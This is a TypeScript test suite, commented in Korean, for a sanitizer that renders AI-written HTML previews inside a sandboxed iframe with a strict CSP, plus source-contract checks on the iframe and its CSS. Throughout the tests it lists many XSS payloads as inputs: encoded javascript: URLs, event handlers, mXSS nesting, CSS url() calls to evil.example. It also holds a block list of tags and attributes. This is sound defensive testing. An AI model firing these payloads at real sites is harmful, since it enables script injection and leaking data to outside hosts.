import assert from "node:assert/strict";
import { readdirSync, readFileSync, statSync } from "node:fs";
import { join, relative } from "node:path";
import { test } from "node:test";
// 순수 모듈 — src 에서 곧장 읽는다(next-pin-name.test.ts 와 같은 모양).
import { PREVIEW_CSP, PREVIEW_MAX_CHARS, previewDoc } from "../src/next/lib/ask-preview.ts";

/**
 * 질문 카드의 시안(2026-10-08 베타 준비 분석 C1 · PLAN D96) — AI 가 쓴 HTML 을 iframe `srcDoc` 으로
 * 그리는 길의 보안 불변식. 본 방어는 `sandbox=""` 와 문서 맨 앞의 CSP 이고, 걸러내기는 그 위에 겹친
 * 방어다. 위쪽은 순수 함수(`previewDoc`)를, 아래쪽은 그 문서를 그리는 소스의 계약을 지킨다.
 */

const doc = (html: string): string => {
  const out = previewDoc(html);
  assert.notEqual(out, null, `문서가 서야 한다: ${html.slice(0, 80)}`);
  return out as string;
};

/** AI 몫 — 우리 문서의 `<body>` 안. */
const body = (html: string): string => {
  const out = doc(html);
  const start = out.indexOf("<body>") + "<body>".length;
  return out.slice(start, out.length - "</body></html>".length);
};

/** 우리가 다시 쓴 태그의 모양 — 이름 · 따옴표 값 속성만. 이 틀을 벗어난 `<` 는 출력에 남지 않는다. */
const TAG = /<\/?([a-z][a-z0-9-]*)((?:\s+[a-z_:][a-z0-9_:.-]*(?:="[^"]*")?)*)\s*\/?>/g;

/** 출력이 `다시 쓴 태그 + `<` 없는 글` 로만 이뤄졌는지, 그리고 태그마다 위험한 것이 없는지 본다. */
function assertWellFormed(out: string, label: string): void {
  const rest = out.replace(TAG, "");
  assert.ok(!rest.includes("<"), `${label}: 다시 쓰지 않은 \`<\` 가 남았다: ${rest.slice(0, 80)}`);
  for (const match of out.matchAll(TAG)) {
    const name = match[1] as string;
    assert.ok(
      !/^(script|style|base|link|meta|iframe|frame|frameset|portal|fencedframe|model|object|embed|applet|noscript|template|math|xmp|plaintext|title|video|audio|canvas|foreignobject|animate|set|html|head|body)$/.test(
        name,
      ),
      `${label}: 허락되지 않은 태그 <${name}>`,
    );
    for (const attr of (match[2] as string).matchAll(/\s+([a-z_:][a-z0-9_:.-]*)(?:="([^"]*)")?/g)) {
      const key = attr[1] as string;
      const value = attr[2] ?? "";
      assert.ok(!key.startsWith("on"), `${label}: 이벤트 속성 ${key}`);
      assert.ok(
        ![
          "srcdoc",
          "action",
          "formaction",
          "srcset",
          "poster",
          "background",
          "data",
          "ping",
          "target",
        ].includes(key),
        `${label}: 허락되지 않은 속성 ${key}`,
      );
      if (key === "href" || key === "xlink:href") {
        assert.ok(
          value.startsWith("#") || (name === "image" && /^data:image\//i.test(value)),
          `${label}: 주소 ${key}=${value}`,
        );
      }
      if (key === "src") assert.ok(/^data:image\//i.test(value), `${label}: src=${value}`);
      if (key === "style")
        assert.ok(
          !/\\|@|expression|javascript:|image-set/i.test(value),
          `${label}: style=${value}`,
        );
    }
  }
}

test("previewDoc: CSP 메타가 문서의 맨 앞 요소다", () => {
  const out = doc("<div>가</div>");
  assert.ok(
    out.startsWith(
      `<!doctype html><html lang="ko"><head><meta http-equiv="Content-Security-Policy" content="${PREVIEW_CSP}">`,
    ),
    out.slice(0, 160),
  );
  // 스크립트 · 네트워크 · 폼 · 프레임을 닫고 인라인 스타일과 data: 만 연다.
  for (const part of [
    "default-src 'none'",
    "style-src 'unsafe-inline'",
    "img-src data:",
    "font-src data:",
    "form-action 'none'",
    "base-uri 'none'",
  ]) {
    assert.ok(PREVIEW_CSP.includes(part), part);
  }
  assert.ok(!/script-src|unsafe-eval|connect-src|\*|https?:/.test(PREVIEW_CSP), PREVIEW_CSP);
  // AI 의 글은 CSP 메타 뒤 `<body>` 안에만 앉는다.
  assert.ok(out.indexOf("Content-Security-Policy") < out.indexOf("<body>"));
  assert.equal((out.match(/http-equiv/gi) ?? []).length, 1);
});

test("previewDoc: 밝은 종이 바탕 · 라이트 색 구성 · 시스템 글꼴 — 어두운 앱에서도 글자가 사라지지 않는다", () => {
  const out = doc("<p>안녕</p>");
  assert.ok(out.includes("color-scheme:light"));
  assert.ok(out.includes("background:#fff"));
  assert.ok(out.includes("system-ui"));
  // 썸네일은 고정 크기의 창이다 — 스크롤바 대신 잘라낸다.
  assert.ok(out.includes("overflow:hidden"));
});

test("previewDoc: 깨끗한 조각은 그대로 앉는다", () => {
  const html =
    '<div style="display:flex;gap:8px"><b>제목</b><span class="k" title="a">본문 &amp; 끝</span><br><img src="data:image/png;base64,AAAA" alt="그림"></div>';
  assert.equal(body(html), html);
});

test("previewDoc: 빈 입력 · 공백 · 걸러 보니 남는 것이 없는 입력은 시안이 없다", () => {
  for (const html of [
    "",
    " ",
    "\n\t  \n",
    "<script>alert(1)</script>",
    "<!-- 주석 -->",
    "<style>p{}</style>",
    "<meta http-equiv=refresh content=0>",
  ]) {
    assert.equal(previewDoc(html), null, JSON.stringify(html));
  }
  // 문자열이 아닌 것이 선로에서 새어 들어와도 던지지 않는다.
  assert.equal(previewDoc(undefined as unknown as string), null);
  assert.equal(previewDoc(null as unknown as string), null);
  assert.equal(previewDoc(42 as unknown as string), null);
});

test("previewDoc: 글자 수 상한 — 넘으면 시안이 없고 카드는 글 선택지로 물러선다", () => {
  const fill = (n: number) => `<p>${"가".repeat(n - "<p></p>".length)}</p>`;
  assert.notEqual(previewDoc(fill(PREVIEW_MAX_CHARS)), null);
  assert.equal(previewDoc(fill(PREVIEW_MAX_CHARS + 1)), null);
  assert.equal(PREVIEW_MAX_CHARS, 24_000);
});

test("previewDoc: <script> 는 안의 글까지 지운다 — 모양을 바꿔 써도", () => {
  const cases = [
    "<div>a</div><script>alert(1)</script><p>b</p>",
    "<div>a</div><SCRIPT SRC=//evil.example/x.js></SCRIPT><p>b</p>",
    "<div>a</div><script\n>alert(1)</script\n ><p>b</p>",
    "<div>a</div><script/x>alert(1)</script><p>b</p>",
    "<div>a</div><scr\0ipt>alert(1)</scr\0ipt><p>b</p>",
    "<div>a</div><svg><script>alert(1)</script></svg><p>b</p>",
    "<div>a</div><script>if (1<2) alert(1)</script ><p>b</p>",
    '<div>a</div><script type="text/template"><p>alert(1)</p></script><p>b</p>',
  ];
  for (const html of cases) {
    const out = body(html);
    assert.ok(!/script/i.test(out), `${JSON.stringify(html)} → ${out}`);
    assert.ok(!out.includes("alert"), `${JSON.stringify(html)} → ${out}`);
    assert.ok(out.startsWith("<div>a</div>"), out);
    assertWellFormed(out, html);
  }
  assert.ok(body("<div>a</div><script>alert(1)</script><p>b</p>").endsWith("<p>b</p>"));
  // 닫히지 않은 스크립트는 나머지를 버린다(브라우저도 끝까지 스크립트로 읽는다).
  assert.equal(body("<p>ok</p><script>alert(1)"), "<p>ok</p>");
  // 이름을 쪼개 필터를 속이려는 모양 — 어느 경우에도 `<script` 는 남지 않는다.
  for (const html of [
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "<<script>alert(1)//<</script>",
    "<scr<!-- -->ipt>alert(1)</scr<!-- -->ipt>",
  ]) {
    const out = previewDoc(html);
    if (out !== null) assertWellFormed(body(html), html);
  }
});

test("previewDoc: on* 속성은 어느 태그에서든 지운다", () => {
  assert.equal(
    body('<div onclick="a()" ONMOUSEOVER=\'b()\' onfocus=c() class="k">x</div>'),
    '<div class="k">x</div>',
  );
  assert.equal(
    body('<img src="data:image/png;base64,AA" onerror="x()" onload=y()>'),
    '<img src="data:image/png;base64,AA">',
  );
  assert.equal(
    body('<svg onload="x()" viewBox="0 0 1 1"><circle r="1" onmouseover="y()"/></svg>'),
    '<svg viewbox="0 0 1 1"><circle r="1" /></svg>',
  );
  assert.equal(
    body("<details open ontoggle=a()><summary>s</summary>x</details>"),
    "<details open><summary>s</summary>x</details>",
  );
  // 따옴표 안의 `>` 가 태그를 끝낸 것으로 읽혀 뒤의 속성이 새어 나오지 않는다.
  assert.equal(body('<div title="a>b" onclick="x()">c</div>'), '<div title="a>b">c</div>');
});

test("previewDoc: javascript: · 바깥 주소는 속성째 지운다 — 인코딩으로 숨겨도", () => {
  const dead = [
    '<a href="javascript:alert(1)">x</a>',
    '<a href=" javascript:alert(1)">x</a>',
    '<a href="JaVaScRiPt:alert(1)">x</a>',
    '<a href="jav&#x61;script:alert(1)">x</a>',
    '<a href="&#106;avascript:alert(1)">x</a>',
    '<a href="java\tscript:alert(1)">x</a>',
    '<a href="http://evil.example/">x</a>',
    '<a href="//evil.example/">x</a>',
    '<a href="data:text/html,<script>alert(1)</script>">x</a>',
    '<a href="vbscript:x">x</a>',
  ];
  for (const html of dead) {
    assert.equal(body(html), "<a>x</a>", html);
  }
  // 같은 문서 안의 앵커는 남는다.
  assert.equal(body('<a href="#top">x</a>'), '<a href="#top">x</a>');
  // 그림은 data: 만, 나머지 불러오는 속성은 모두 지운다.
  assert.equal(body('<img src="https://evil.example/p.png" alt="a">'), '<img alt="a">');
  assert.equal(
    body('<img src="data:image/png;base64,AA" srcset="https://evil.example/p.png 2x">'),
    '<img src="data:image/png;base64,AA">',
  );
  assert.equal(
    body(
      '<form action="https://evil.example" method="post"><input formaction="https://evil.example" value="v"></form>',
    ),
    '<form method="post"><input value="v"></form>',
  );
  assert.equal(
    body('<svg><use href="https://evil.example/x.svg#a"/><use xlink:href="#a"/></svg>'),
    '<svg><use /><use xlink:href="#a" /></svg>',
  );
  assert.equal(
    body(
      '<svg><image href="data:image/png;base64,AA" width="1"/><image href="https://evil.example/p.png"/></svg>',
    ),
    '<svg><image href="data:image/png;base64,AA" width="1" /><image /></svg>',
  );
  assert.equal(
    body('<table background="https://evil.example/p.png"><tr><td>c</td></tr></table>'),
    "<table><tr><td>c</td></tr></table>",
  );
  assert.equal(
    body('<div target="_blank" autofocus accesskey="x" srcdoc="<p>x</p>">d</div>'),
    "<div>d</div>",
  );
});

test("previewDoc: <base> · <meta refresh> · <link> · <style> · 프레임 · 플러그인은 태그째 지운다", () => {
  const html = [
    '<base href="https://evil.example/">',
    '<meta http-equiv="refresh" content="0;url=https://evil.example/">',
    '<meta http-equiv="Content-Security-Policy" content="default-src *">',
    '<link rel="stylesheet" href="https://evil.example/a.css">',
    '<style>@import url("https://evil.example/a.css"); body{background:url(https://evil.example/p.png)}</style>',
    '<iframe src="https://evil.example/"></iframe>',
    '<object data="https://evil.example/x"></object>',
    '<embed src="https://evil.example/x">',
    '<video src="https://evil.example/v" poster="https://evil.example/p"></video>',
    '<audio src="https://evil.example/a"></audio>',
    "<math><mi>x</mi></math>",
    "<template><p>t</p></template>",
    "<noscript><p>n</p></noscript>",
    "<p>남는 글</p>",
  ].join("");
  assert.equal(body(html), "<p>남는 글</p>");
  // 우리 CSP 메타 하나만 남는다 — AI 의 메타가 정책을 느슨하게 하거나 이동시키지 못한다.
  assert.equal((doc(html).match(/<meta http-equiv/g) ?? []).length, 1);
  assert.ok(!doc(html).includes("evil.example"));
});

// 거부 목록이라 이름을 빠뜨리면 그 요소가 남는다(2026-10-08 검토 FIX1) — 하나씩 지운다. 안의 글(대체 내용)도 함께.
const WHOLE_DROPPED = ["portal", "fencedframe", "model", "embed", "applet", "frame", "frameset"];

for (const name of WHOLE_DROPPED) {
  test(`previewDoc: <${name}> 는 태그째 안의 글까지 지운다`, () => {
    const inner = `<p>안의 ${name}</p>`;
    const open = `<${name} src="https://evil.example/x" data-x="1">${inner}</${name}>`;
    assert.equal(body(`<p>앞</p>${open}<p>뒤</p>`), "<p>앞</p><p>뒤</p>", "열고 닫은 것");
    assert.equal(body(`<p>앞</p>${open.toUpperCase()}<p>뒤</p>`), "<p>앞</p><p>뒤</p>", "대문자");
    assert.equal(
      body(`<p>앞</p><${name} / src="data:image/png;base64,AAAA">${inner}</${name} ><p>뒤</p>`),
      "<p>앞</p><p>뒤</p>",
      "스스로 닫는 모양 · 닫는 태그의 공백",
    );
    for (const text of [open, `<${name}>`, `<${name}/>`, `<${name} src=x>`]) {
      assert.ok(!doc(`<p>x</p>${text}`).includes(`<${name}`), `${text} 가 남았다`);
      assert.ok(!doc(`<p>x</p>${text}`).includes("evil.example"));
    }
  });
}

test("previewDoc: 안이 없는 <embed> · <frame> 은 닫는 태그가 없어도 뒤의 글을 버리지 않는다", () => {
  for (const name of ["embed", "frame"]) {
    assert.equal(
      body(`<p>앞</p><${name} src="https://evil.example/x"><p>뒤</p>`),
      "<p>앞</p><p>뒤</p>",
    );
    assert.equal(body(`<p>앞</p><${name}/><p>뒤</p>`), "<p>앞</p><p>뒤</p>");
  }
  // 안을 품는 요소는 닫는 태그가 없으면 나머지를 버린다(브라우저가 나머지를 그 요소의 안으로 읽는다).
  for (const name of ["portal", "fencedframe", "model", "applet", "frameset"]) {
    assert.equal(body(`<p>앞</p><${name} src="x"><p>뒤</p>`), "<p>앞</p>", name);
  }
});

test("previewDoc: 완전한 문서가 들어와도 우리 문서 하나로 접힌다", () => {
  const html =
    '<!DOCTYPE html><html lang="en" onload="x()"><head><title>t</title><meta charset="x"><meta http-equiv="refresh" content="0;url=https://evil.example/"><style>body{display:none}</style><script>alert(1)</script></head><body onload="y()" background="https://evil.example/p.png"><p>안녕</p></body></html>';
  const out = doc(html);
  assert.ok(
    out.startsWith(
      '<!doctype html><html lang="ko"><head><meta http-equiv="Content-Security-Policy"',
    ),
    out.slice(0, 120),
  );
  assert.equal(body(html), "<p>안녕</p>");
  assert.equal((out.match(/<html/g) ?? []).length, 1);
  assert.equal((out.match(/<body/g) ?? []).length, 1);
  assert.equal((out.match(/<head/g) ?? []).length, 1);
  assert.ok(!out.includes("display:none") && !out.includes("onload") && !out.includes("<title"));
});

test("previewDoc: 스타일 속성 — 바깥을 부르거나 숨기는 모양이면 속성째 지운다", () => {
  assert.equal(
    body('<div style="color:red;padding:4px">x</div>'),
    '<div style="color:red;padding:4px">x</div>',
  );
  assert.equal(
    body('<div style="background:url(data:image/png;base64,AA)">x</div>'),
    '<div style="background:url(data:image/png;base64,AA)">x</div>',
  );
  for (const style of [
    "background:url(https://evil.example/p.png)",
    "background:URL( 'https://evil.example/p.png' )",
    'background:url("//evil.example/p.png")',
    "background:image-set('https://evil.example/p.png' 1x)",
    "background:-webkit-image-set(url(data:image/png;base64,AA) 1x, 'https://evil.example/p.png' 2x)",
    "width:expression(alert(1))",
    "background:u\\72l(https://evil.example/p.png)",
    "behavior:url(x.htc)",
    "-moz-binding:url(x)",
    "background:url(javascript:alert(1))",
    "@import 'x'",
  ]) {
    const quote = style.includes('"') ? "'" : '"';
    assert.equal(body(`<div style=${quote}${style}${quote}>x</div>`), "<div>x</div>", style);
  }
  // 두 번째 url() 이 바깥이면 속성째 지운다.
  assert.equal(
    body(
      '<div style="background:url(data:image/png;base64,AA),url(https://evil.example/p.png)">x</div>',
    ),
    "<div>x</div>",
  );
});

test("previewDoc: 글 속의 `<` 는 `&lt;` 로, 주석 · 문서형 · 처리 명령은 버린다", () => {
  assert.equal(body("3 < 4 그리고 a < b 와 <3"), "3 &lt; 4 그리고 a &lt; b 와 &lt;3");
  // `<` 바로 뒤의 글자는 태그의 시작이다 — 닫히지 않으면 브라우저도 그 태그를 버린다.
  assert.equal(body("<p>a</p>b<c 와 d"), "<p>a</p>b");
  assert.equal(body("<p>a</p></ x><p>b</p>"), "<p>a</p>&lt;/ x><p>b</p>");
  assert.equal(body("<p>a</p><!-- <script>alert(1)</script> --><p>b</p>"), "<p>a</p><p>b</p>");
  assert.equal(body("<!DOCTYPE html><p>x</p>"), "<p>x</p>");
  assert.equal(body('<?xml version="1.0"?><p>x</p>'), "<p>x</p>");
  // CDATA 는 HTML 본문에서 첫 `>` 까지의 가짜 주석이다 — 브라우저와 같은 자리에서 끝난다.
  assert.equal(body("<![CDATA[ <script>alert(1)</script> ]]><p>x</p>"), "alert(1) ]]><p>x</p>");
  // 닫히지 않은 주석 · 태그는 나머지를 버린다(브라우저도 그 자리에서 읽기를 접는다).
  assert.equal(body("<p>a</p><!-- <p>b</p>"), "<p>a</p>");
  assert.equal(body('<p>a</p><div class="x'), "<p>a</p>");
  assert.equal(body("<p>a</p><div title='x"), "<p>a</p>");
});

test("previewDoc: 남기는 태그는 우리 손으로 다시 쓴다 — 속성 값의 따옴표가 새지 못한다", () => {
  assert.equal(
    body("<div title='a\"b' data-x=1 hidden>x</div>"),
    '<div title="a&quot;b" data-x="1" hidden>x</div>',
  );
  // 대문자 · 홑따옴표 · 따옴표 없는 값 · 값 없는 속성.
  assert.equal(body("<DIV CLASS=A ID='b' HIDDEN>x</DIV>"), '<div class="A" id="b" hidden>x</div>');
  // 이름이 틀을 벗어난 태그 · 속성은 지운다(안의 글은 남는다).
  assert.equal(body("<a$b>x</a$b>"), "x");
  assert.equal(body('<div a"b="1" c=d>x</div>'), '<div c="d">x</div>');
});

test("previewDoc: SVG 의 스스로 닫는 태그는 그대로 닫힌다 · 움직임 · foreignObject 는 지운다", () => {
  assert.equal(
    body('<svg viewBox="0 0 10 10"><path d="M0 0L10 10" /><circle cx="5" cy="5" r="2"/></svg>'),
    '<svg viewbox="0 0 10 10"><path d="M0 0L10 10" /><circle cx="5" cy="5" r="2" /></svg>',
  );
  assert.equal(
    body(
      '<svg><rect width="1" height="1"><animate attributeName="x" values="0;1"></animate><set attributeName="href" to="javascript:alert(1)"/></rect><foreignObject><p>f</p></foreignObject><g/></svg>',
    ),
    '<svg><rect width="1" height="1"></rect><g /></svg>',
  );
});

test("previewDoc: 출력은 언제나 `다시 쓴 태그 + < 없는 글` 이다 — 거친 입력 묶음", () => {
  const corpus = [
    "<img src=x onerror=alert(1)//",
    '<a href="x" onclick="a()"',
    "<div><<div>></div>",
    "<p <p>>x</p>",
    '<p a="<script>alert(1)</script>">x</p>',
    "<p a=<script>alert(1)</script>>x</p>",
    "<textarea><script>alert(1)</script></textarea>",
    "<title><script>alert(1)</script></title><p>x</p>",
    "<xmp><script>alert(1)</script></xmp><p>x</p>",
    "<plaintext><script>alert(1)</script>",
    "<noembed><script>alert(1)</script></noembed><p>x</p>",
    "<select><option><script>alert(1)</script></option></select>",
    "<svg><a xlink:href=javascript:alert(1)><text>x</text></a></svg>",
    "<svg><style>*{background:url(https://evil.example/p.png)}</style><p>x</p></svg>",
    "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)></style></mglyph></table></mtext></math><p>x</p>",
    "<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>",
    "<a/href=javascript:alert(1)>x</a>",
    '<a href="x"/onclick=alert(1)>x</a>',
    "<img/src=x/onerror=alert(1)>",
    "<p>ok</p></script><script>alert(1)</script>",
    "<p>a</p>\u0000<s\u0000cript>alert(1)</s\u0000cript>",
    "<p>\uD800 lone surrogate \uDFFF</p>",
    "< script>alert(1)</ script>",
    "<script >alert(1)</script>",
    "<SCRİPT>alert(1)</SCRİPT>",
  ];
  for (const html of corpus) {
    const out = previewDoc(html);
    if (out === null) continue;
    assertWellFormed(body(html), html);
    assert.ok(!/<script|<style|<iframe|<object|<embed|<link|<base|<meta/i.test(body(html)), html);
  }
});

test("previewDoc: 한 번 걸러 낸 본문은 다시 걸러도 그대로다(고정점)", () => {
  for (const html of [
    '<div style="color:red" onclick="x()"><a href="javascript:1">a</a><img src=x><svg><path d="M0 0"/></svg>3 < 4</div>',
    "<p title='a\"b'>x</p><!-- c --><br><hr/>",
    '<form action="x"><input type="text" value="v"><select><option selected>o</option></select></form>',
  ]) {
    const once = body(html);
    assert.equal(body(once), once, html);
  }
});

test("previewDoc: 이상한 입력에서도 던지지 않고 제때 끝난다", () => {
  const started = Date.now();
  const huge = [
    "\0".repeat(PREVIEW_MAX_CHARS),
    "<".repeat(PREVIEW_MAX_CHARS),
    "<a ".repeat(PREVIEW_MAX_CHARS / 3),
    "<script>".repeat(PREVIEW_MAX_CHARS / 8),
    "<!--".repeat(PREVIEW_MAX_CHARS / 4),
    "<p>".repeat(PREVIEW_MAX_CHARS / 3),
    "<div>".repeat(5000),
    `<div title="${"긴".repeat(PREVIEW_MAX_CHARS - 40)}">x</div>`,
    `<${"a".repeat(PREVIEW_MAX_CHARS - 2)}>`,
    `<p ${"x=1 ".repeat(PREVIEW_MAX_CHARS / 4 - 3)}>`,
    `<div style="${"url(".repeat(PREVIEW_MAX_CHARS / 8)}">x</div>`,
    '<div style="'.repeat(1500),
    "\uD800".repeat(1000),
    "</".repeat(PREVIEW_MAX_CHARS / 2),
    "<script></script ".repeat(1000),
  ];
  for (const html of huge) {
    const out = previewDoc(html);
    assert.ok(out === null || typeof out === "string");
    if (out !== null)
      assertWellFormed(
        out.slice(out.indexOf("<body>") + 6, out.length - "</body></html>".length),
        html.slice(0, 20),
      );
  }
  assert.ok(Date.now() - started < 4000, `너무 오래 걸렸다: ${Date.now() - started}ms`);
});

// ---------------------------------------------------------------------------
// 소스 계약 — 시안을 그리는 쪽이 sandbox="" 를 지킨다
// ---------------------------------------------------------------------------

const SRC = join(import.meta.dirname, "../src");
const read = (path: string): string => readFileSync(join(SRC, path), "utf8");

/** 주석을 걷는다 — 주석의 설명이 계약 검사에 걸리지 않게. */
const uncommented = (source: string): string =>
  source.replace(/\/\*[\s\S]*?\*\//g, "").replace(/(^|[^:])\/\/.*$/gm, "$1");

function sourceFiles(dir: string): string[] {
  return readdirSync(dir).flatMap((name) => {
    const full = join(dir, name);
    if (statSync(full).isDirectory()) return sourceFiles(full);
    return /\.tsx?$/.test(name) ? [full] : [];
  });
}

test('소스 계약: 시안 iframe 은 sandbox="" — 토큰을 하나도 주지 않는다', () => {
  const source = uncommented(read("next/chat/AskPreview.tsx"));
  const frames = source.match(/<iframe\b[\s\S]*?\/>/g) ?? [];
  assert.ok(frames.length >= 1, "시안을 그리는 iframe 이 이 파일에 있어야 한다");
  for (const frame of frames) {
    assert.ok(/\ssandbox=""(\s|\/)/.test(frame), `sandbox="" 가 아니다: ${frame}`);
    assert.ok(!/sandbox=\{/.test(frame), `sandbox 는 상수 빈 문자열이어야 한다: ${frame}`);
    assert.ok(frame.includes('referrerPolicy="no-referrer"'), frame);
    assert.ok(frame.includes('loading="lazy"'), frame);
    assert.ok(frame.includes("tabIndex={-1}"), frame);
    assert.ok(/\stitle=\{/.test(frame), `title 이 있어야 한다: ${frame}`);
  }
  // 토큰은 파일 어디에도 없다 — 주석 · 문자열 · 클래스 이름 어디에서도.
  assert.ok(!/allow-[a-z-]+/.test(source), "sandbox 토큰(allow-…)이 소스에 있다");
  assert.ok(!/allow=/.test(source), "iframe 권한(allow=)을 주지 않는다");
});

test("소스 계약: 시안 문서(srcDoc)를 만드는 곳은 하나다 — 다른 파일이 AI 의 HTML 을 그리지 않는다", () => {
  const owners: string[] = [];
  for (const file of sourceFiles(SRC)) {
    const source = uncommented(readFileSync(file, "utf8"));
    if (/srcDoc|srcdoc/.test(source)) owners.push(relative(SRC, file));
    if (
      /dangerouslySetInnerHTML/.test(source) &&
      relative(SRC, file) === "next/chat/AskPreview.tsx"
    ) {
      assert.fail("시안을 innerHTML 로 그리지 않는다");
    }
  }
  // 시안 문서의 소비자는 `AskPreview.tsx` 하나(`lib/ask-preview.ts` 는 문서를 짓는 순수 함수라 문자열로만 말한다).
  assert.deepEqual(owners.filter((file) => file !== "next/lib/ask-preview.ts").sort(), [
    "next/chat/AskPreview.tsx",
  ]);
  assert.ok(
    !/<iframe/.test(uncommented(read("next/chat/cards.tsx"))),
    "카드는 iframe 을 직접 그리지 않는다",
  );
  const adapter = uncommented(read("next/chat/AskPreview.tsx"));
  assert.ok(adapter.includes("srcDoc={doc}"), "iframe 은 `previewDoc` 가 지은 문서만 받는다");
});

test("소스 계약: 시안이 있는 질문은 누르는 즉시 보내지 않고, 글 선택지는 그대로 즉시 보낸다", () => {
  const source = uncommented(read("next/chat/cards.tsx"));
  // 즉시 전송의 조건 — 한 질문 · 하나 고르기 · 쓸 만한 시안이 없을 때뿐이다.
  assert.match(source, /const instant = single && !visual\(0\);/);
  assert.match(source, /const pick = \(q: AskQuestion, label: string\) => \{\s*if \(instant\) \{/);
  // 시안 질문의 바닥 단추는 `이걸로 할게요` — 그림이 없는 여럿 · 여러 질문은 그대로 `보내기`.
  assert.match(source, /\{!instant && \(/);
  assert.ok(source.includes("single ? L.askPreview.pickThis : L.inbox.send"));
  // 고른 시안을 되돌려 보내는 `annotations` 는 쓰지 않는다 — Claude 는 자기 시안을 안다.
  assert.ok(!/annotations/.test(source));
});

test("소스 계약: 그림의 창 — 고정 논리 폭을 창 폭에 맞춰 줄이고, 포인터는 그림에 닿지 않는다", () => {
  const css = readFileSync(join(SRC, "next/chat/chat.css"), "utf8");
  const rule = (selector: string): string => {
    const at = css.indexOf(`\n${selector} {`);
    assert.ok(at >= 0, `${selector} 규칙이 있어야 한다`);
    return css.slice(at, css.indexOf("}", at));
  };
  const frame = rule(".nx-askp-frame");
  assert.match(frame, /pointer-events:\s*none/);
  assert.match(frame, /width:\s*480px/);
  assert.match(frame, /height:\s*360px/);
  assert.match(frame, /transform-origin:\s*0 0/);
  // 줄이는 비율은 창 폭 ÷ 논리 폭 — 폭을 고치면 두 곳이 함께 간다.
  assert.match(css, /scale\(calc\(100cqw \/ 480px\)\)/);
  assert.match(rule(".nx-askp-stage .nx-askp-frame"), /height:\s*540px/);
  assert.match(rule(".nx-askp-thumb"), /aspect-ratio:\s*4 \/ 3/);
  assert.match(rule(".nx-askp-thumb"), /container-type:\s*inline-size/);
  // 카드 전체를 덮는 단추 · 그 위의 `크게 보기`.
  assert.match(css, /\.nx \.nx-askp-pick::after \{[^}]*inset:\s*0/);
  assert.match(css, /\.nx \.nx-askp-zoom \{[^}]*z-index:\s*1/);
  // 질의 규칙은 `.nx ` 접두를 달아 기본 규칙(0-2-0)을 이긴다(질의는 특이도를 더하지 않는다).
  const queries = css.match(/@container \(max-width: 287px\) \{[\s\S]*?\n\}/g) ?? [];
  assert.equal(queries.length, 1);
  const selectors = (queries[0] as string).match(/^ {2}[^\s@}][^{]*\{/gm) ?? [];
  assert.ok(selectors.length >= 3);
  for (const selector of selectors) assert.ok(selector.trim().startsWith(".nx "), selector);
});
